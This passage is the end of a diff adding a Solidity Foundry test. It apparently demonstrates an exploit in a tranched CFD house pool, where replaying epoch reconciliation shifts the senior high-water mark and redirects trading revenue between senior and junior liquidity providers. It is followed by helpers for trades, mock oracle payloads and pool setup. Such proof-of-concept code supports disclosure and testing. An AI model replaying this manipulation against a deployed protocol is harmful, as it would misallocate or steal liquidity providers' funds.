+            emit log_named_uint("replay1.hwm.2E.normalized100", pool.seniorHighWaterMark());
+
+            // Replay 2: 2E -> E under the identical economic snapshot.
+            _reconcileAt(100, 100);
+            _assertEconomicsUnchanged(beforeReplay, "replay-2");
+            assertEq(pool.seniorPrincipal(), equityAssets, "replay 2 keeps S=E");
+            assertEq(pool.seniorHighWaterMark(), equityAssets, "replay 2: normalized 100 -> 50");
+            assertEq(pool.pendingRecapitalizationAssets(), 0, "replay 2 consumes final E");
+            emit log_named_uint("replay2.hwm.E.normalized50", pool.seniorHighWaterMark());
+
+            (, uint256 workBeforeFinalSettle) = junior.getMaturedRedeemHead(vm.getBlockTimestamp() / 1 hours);
+            assertEq(workBeforeFinalSettle, 1, "attack leaves one matured epoch for final settlement");
+        } else {
+            // Match both authenticated publications and exact time/block
+            // advances without invoking HousePool reconciliation.
+            router.updateMarkPrice(_livePayload(100, 100));
+            router.updateMarkPrice(_livePayload(100, 100));
+            _assertEconomicsUnchanged(beforeReplay, "control-marks");
+            assertEq(pool.seniorHighWaterMark(), 3 * equityAssets, "marks alone preserve normalized 150");
+            assertEq(pool.pendingRecapitalizationAssets(), 2 * equityAssets, "marks alone preserve 2E residual");
+        }
+
+        // Cash and the old liability leave together. The same ordinary losing
+        // trader then supplies the revenue whose tranche ownership diverges.
+        vm.prank(CLAIM_WINNER);
+        engine.settleTraderClaim(CLAIM_WINNER);
+        _fundTrader(FINAL_LOSER, 180_000e6);
+        uint256 cashBeforeRevenue = pool.totalAssets();
+        _trade(FINAL_LOSER, CfdTypes.Side.LONG, 1_000 * LOT, 150_000e6, false, 100, 100);
+        _trade(FINAL_LOSER, CfdTypes.Side.LONG, 1_000 * LOT, 0, true, 200, 100);
+        result.revenueAssets = pool.totalAssets() - cashBeforeRevenue;
+        _reconcileAt(200, 100);
+
+        result.rawPoolAssets = pool.rawAssets();
+        result.accountedPoolAssets = pool.accountedAssets();
+        result.seniorPrincipal = pool.seniorPrincipal();
+        result.juniorPrincipal = pool.juniorPrincipal();
+        result.seniorHighWaterMark = pool.seniorHighWaterMark();
+        result.pendingRecapitalization = pool.pendingRecapitalizationAssets();
+        result.traderClaims = engine.totalTraderClaimBalanceAssets();
+        (uint256 finalPositionSize,,,,,,) = engine.positions(FINAL_LOSER);
+        result.finalPositionSize = finalPositionSize;
+        result.seniorLpAssets = senior.convertToAssets(senior.balanceOf(SENIOR_LP));
+        result.juniorLpAssets = junior.convertToAssets(junior.balanceOf(JUNIOR_LP));
+        result.seniorSupply = senior.totalSupply();
+        result.juniorSupply = junior.totalSupply();
+    }
+
+    function _economicSnapshot() private view returns (EconomicSnapshot memory snapshot) {
+        snapshot.rawPoolAssets = pool.rawAssets();
+        snapshot.accountedPoolAssets = pool.accountedAssets();
+        snapshot.canonicalPoolAssets = pool.totalAssets();
+        snapshot.traderClaims = engine.totalTraderClaimBalanceAssets();
+        snapshot.maxLiability = _maxLiability();
+        snapshot.markPrice = engine.lastMarkPrice();
+    }
+
+    function _assertEconomicsUnchanged(EconomicSnapshot memory expected, string memory tag) private view {
+        EconomicSnapshot memory actual = _economicSnapshot();
+        assertEq(actual.rawPoolAssets, expected.rawPoolAssets, string.concat(tag, ": raw cash"));
+        assertEq(actual.accountedPoolAssets, expected.accountedPoolAssets, string.concat(tag, ": accounted cash"));
+        assertEq(actual.canonicalPoolAssets, expected.canonicalPoolAssets, string.concat(tag, ": canonical cash"));
+        assertEq(actual.traderClaims, expected.traderClaims, string.concat(tag, ": trader claims"));
+        assertEq(actual.maxLiability, expected.maxLiability, string.concat(tag, ": max liability"));
+        assertEq(actual.markPrice, expected.markPrice, string.concat(tag, ": economic mark price"));
+    }
+
+    function _maxLiability() private view returns (uint256) {
+        (uint256 longMaxProfit,,,) = engine.sides(uint256(CfdTypes.Side.LONG));
+        (uint256 shortMaxProfit,,,) = engine.sides(uint256(CfdTypes.Side.SHORT));
+        return longMaxProfit > shortMaxProfit ? longMaxProfit : shortMaxProfit;
+    }
+
+    function _openBalancedInitialBook() private {
+        _trade(CLAIM_WINNER, CfdTypes.Side.SHORT, 3_000 * LOT, 40_000e6, false, 100, 100);
+        _trade(FIRST_WINNER, CfdTypes.Side.LONG, 3_000 * LOT, 50_000e6, false, 100, 100);
+        _trade(CLAIM_WINNER, CfdTypes.Side.SHORT, 3_000 * LOT, 40_000e6, false, 100, 100);
+        _trade(FIRST_WINNER, CfdTypes.Side.LONG, 3_000 * LOT, 50_000e6, false, 100, 100);
+        _trade(CLAIM_WINNER, CfdTypes.Side.SHORT, 3_000 * LOT, 40_000e6, false, 100, 100);
+        _trade(FIRST_WINNER, CfdTypes.Side.LONG, 3_000 * LOT, 50_000e6, false, 100, 100);
+        _trade(CLAIM_WINNER, CfdTypes.Side.SHORT, 990 * LOT, 30_000e6, false, 100, 100);
+        _trade(FIRST_WINNER, CfdTypes.Side.LONG, 990 * LOT, 30_000e6, false, 100, 100);
+    }
+
+    function _reconcileAt(uint256 numerator, uint256 denominator) private {
+        bytes[] memory data = _livePayload(numerator, denominator);
+        vm.prank(KEEPER);
+        router.settleLpEpoch(data);
+    }
+
+    function _prequeueReconcileWork(uint256 epochs) private {
+        uint256 cooldownEnd = junior.lastDepositTime(JUNIOR_LP) + junior.DEPOSIT_COOLDOWN();
+        if (vm.getBlockTimestamp() < cooldownEnd) vm.warp(cooldownEnd);
+        for (uint256 i; i < epochs; ++i) {
+            vm.prank(JUNIOR_LP);
+            junior.transfer(DUST_LP, 1);
+            vm.prank(DUST_LP);
+            uint256 requestId = junior.requestRedeem(1, DUST_LP, DUST_LP);
+            if (i < 2 || i + 2 >= epochs) emit log_named_uint("prequeue.requestId", requestId);
+            vm.warp(vm.getBlockTimestamp() + 1 hours);
+            vm.roll(vm.getBlockNumber() + 1);
+        }
+    }
+
+    function _trade(
+        address account,
+        CfdTypes.Side side,
+        uint256 size,
+        uint256 margin,
+        bool isClose,
+        uint256 numerator,
+        uint256 denominator
+    ) private {
+        (uint256 currentSize,,,,,,) = engine.positions(account);
+        OrderV3Types.OrderRequest memory request;
+        request.clientOrderId = keccak256(abi.encode("h1-multipass", ++clientNonce));
+        request.side = side;
+        request.sizeDelta = size;
+        request.marginDelta = isClose ? 0 : margin;
+        request.targetPrice = side == CfdTypes.Side.LONG
+            ? (isClose ? type(uint256).max : 1)
+            : (isClose ? 1 : type(uint256).max);
+        request.isClose = isClose;
+        request.bounds = OrderV3Types.ExecutionBounds({
+            submitBy: uint64(block.timestamp + router.maxExecutionWindowSeconds()),
+            executionWindowSeconds: uint32(router.maxExecutionWindowSeconds()),
+            allowedExecutionModes: 7,
+            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
+            maxExecutionBountyAssets: type(uint256).max,
+            maxExecutionNotionalAssets: type(uint256).max,
+            maxGrossAccountDebitAssets: type(uint256).max,
+            maxActionChargeAssets: type(uint256).max,
+            maxExplicitFeesAssets: type(uint256).max,
+            maxPostPositionSize: isClose ? currentSize - size : currentSize + size,
+            minPostSettlementBalanceAssets: 0,
+            minPostPositionEquityAssets: 0,
+            maxPostLeverageBps: type(uint32).max
+        });
+        emit log_named_address("commit.account", account);
+        emit log_named_uint("commit.side", uint8(side));
+        emit log_named_uint("commit.size", size);
+        vm.prank(account);
+        uint64 id = router.commitOrder(request);
+        (IOrderRouterAccounting.PendingOrderView memory pending,) = router.getPendingOrderView(id);
+        uint64 commit = pending.commitTime;
+        vm.roll(vm.getBlockNumber() + 1);
+        vm.warp(vm.getBlockTimestamp() + 1);
+        bytes[] memory executionPayload = _payload(numerator, denominator, commit + 1, commit);
+        vm.prank(KEEPER);
+        OrderV3Types.ExecutionResult memory result = router.executeOrder(id, executionPayload);
+        if (uint8(result.status) != uint8(OrderV3Types.LifecycleStatus.Executed)) {
+            emit log_named_uint("failed.order", id);
+            emit log_named_uint("failed.status", uint8(result.status));
+            emit log_named_uint("failed.pendingReason", uint8(result.pendingReason));
+            emit log_named_uint("failed.terminalReason", uint8(result.terminalReason));
+        }
+        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "order did not execute");
+    }
+
+    function _fundTrader(address account, uint256 amount) private {
+        token.mint(account, amount);
+        vm.startPrank(account);
+        token.approve(address(clearinghouse), amount);
+        clearinghouse.deposit(account, amount);
+        vm.stopPrank();
+    }
+
+    function _seedAndFundPool(uint256 amount) private {
+        token.mint(address(this), 2_000e6);
+        token.approve(address(pool), 2_000e6);
+        pool.initializeSeedPosition(false, 1_000e6, JUNIOR_LP);
+        pool.initializeSeedPosition(true, 1_000e6, SENIOR_LP);
+        pool.activateTrading();
+        token.mint(JUNIOR_LP, amount);
+        vm.startPrank(JUNIOR_LP);
+        token.approve(address(junior), amount);
+        uint256 id = junior.requestDeposit(amount, JUNIOR_LP, JUNIOR_LP);
+        vm.stopPrank();
+        vm.warp(junior.depositEpochStart(id));
+        pool.settleLpEpoch(0, 0);
+        vm.prank(JUNIOR_LP);
+        junior.claimDeposit(id, amount, JUNIOR_LP, JUNIOR_LP);
+    }
+
+    function _activateReleaseConfig() private {
+        IHousePool.PoolConfig memory pc = IHousePool.PoolConfig({
+            seniorRateBps: pool.seniorRateBps(),
+            markStalenessLimit: pool.markStalenessLimit(),
+            seniorFrozenLpFeeBps: pool.seniorFrozenLpFeeBps(),
+            juniorFrozenLpFeeBps: pool.juniorFrozenLpFeeBps(),
+            maxSeniorExposureAssets: 40_000_000e6,
+            maxSeniorShareBps: 8000
+        });
+        pool.proposePoolConfig(pc);
+
+        OrderRouterAdmin admin = OrderRouterAdmin(router.admin());
+        IOrderRouterAdminHost.RouterConfig memory rc;
+        rc.maxExecutionWindowSeconds = router.maxExecutionWindowSeconds();
+        rc.orderExecutionStalenessLimit = oracle.orderExecutionStalenessLimit();
+        rc.liquidationStalenessLimit = oracle.liquidationStalenessLimit();
+        rc.basketMaxConfidenceRatioBps = 10;
+        rc.orderSettlementWindow = 15;
+        rc.maxComponentPublishTimeDivergence = 5;
+        rc.adverseConfidenceMultiplierBps = 2500;
+        rc.minOpenNotionalAssets = 1_000e6;
+        rc.openOrderExecutionBountyBps = router.openOrderExecutionBountyBps();
+        rc.minOpenOrderExecutionBountyAssets = router.minOpenOrderExecutionBountyAssets();
+        rc.maxOpenOrderExecutionBountyAssets = router.maxOpenOrderExecutionBountyAssets();
+        rc.positionProtectionTriggerBountyAssets = 200_000;
+        rc.maxPendingOrders = 5;
+        rc.minEngineGas = router.minEngineGas();
+        rc.maxPruneOrdersPerCall = router.maxPruneOrdersPerCall();
+        admin.proposeRouterConfig(rc);
+
+        uint256 activation = pool.poolConfigActivationTime();
+        if (admin.routerConfigActivationTime() > activation) activation = admin.routerConfigActivationTime();
+        vm.warp(activation);
+        pool.finalizePoolConfig();
+        admin.finalizeRouterConfig();
+    }
+
+    function _livePayload(uint256 numerator, uint256 denominator) private returns (bytes[] memory data) {
+        vm.roll(vm.getBlockNumber() + 1);
+        vm.warp(vm.getBlockTimestamp() + 1);
+        uint64 tick = uint64(vm.getBlockTimestamp());
+        return _payload(numerator, denominator, tick, tick - 1);
+    }
+
+    function _payload(uint256 numerator, uint256 denominator, uint64 publishTime, uint64 previousTime)
+        private
+        view
+        returns (bytes[] memory data)
+    {
+        MockPyth.FeedUpdate[] memory updates = new MockPyth.FeedUpdate[](6);
+        for (uint256 i; i < 6; ++i) {
+            bool inverted = i == 1 || i >= 3;
+            uint256 raw = inverted
+                ? (1e16 * denominator) / (basePrices[i] * numerator)
+                : (basePrices[i] * numerator) / denominator;
+            updates[i] = MockPyth.FeedUpdate(
+                feedIds[i], MockPyth.MockPrice(int64(uint64(raw)), 0, -8, publishTime, previousTime)
+            );
+        }
+        data = new bytes[](1);
+        data[0] = abi.encode(updates);
+    }
+
+    function _releaseTopology()
+        private
+        pure
+        returns (bytes32[] memory ids, uint256[] memory weights, uint256[] memory bases, bool[] memory inversions)
+    {
+        ids = new bytes32[](6);
+        weights = new uint256[](6);
+        bases = new uint256[](6);
+        inversions = new bool[](6);
+        uint256[6] memory ws = [uint256(0.576e18), 0.136e18, 0.119e18, 0.091e18, 0.042e18, 0.036e18];
+        uint256[6] memory bs = [uint256(117_500_000), 638_000, 134_480_000, 72_880_000, 10_860_000, 126_100_000];
+        for (uint256 i; i < 6; ++i) {
+            ids[i] = bytes32(i + 1);
+            weights[i] = ws[i];
+            bases[i] = bs[i];
+            inversions[i] = i == 1 || i >= 3;
+        }
+    }
+
+    function _warpToNextMondayAtTen() private {
+        uint256 day = block.timestamp / 1 days;
+        uint256 target = day * 1 days + 10 hours;
+        if (target <= block.timestamp) ++day;
+        while ((day + 4) % 7 != 1) ++day;
+        vm.warp(day * 1 days + 10 hours);
+    }
+}
```
